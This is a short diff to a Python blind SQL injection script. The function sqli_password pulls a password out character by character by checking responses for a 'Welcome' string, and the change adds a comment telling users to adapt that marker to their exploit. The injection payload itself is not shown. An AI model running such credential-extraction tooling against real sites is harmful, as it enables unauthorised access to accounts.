@@ -44,6 +44,7 @@ def sqli_password(url):
                 # print(f"Testing position {i}, char {j} ({chr(j)}), Status: {r.status_code}")
                 
                 # Check if the condition was true
+                # Edit the "Welcom" message to suit your exploit
                 if "Welcome" in r.text or "welcome" in r.text.lower():
                     password_extracted += chr(j)
                     print(f"\n[+] Found character {i}: {chr(j)}")
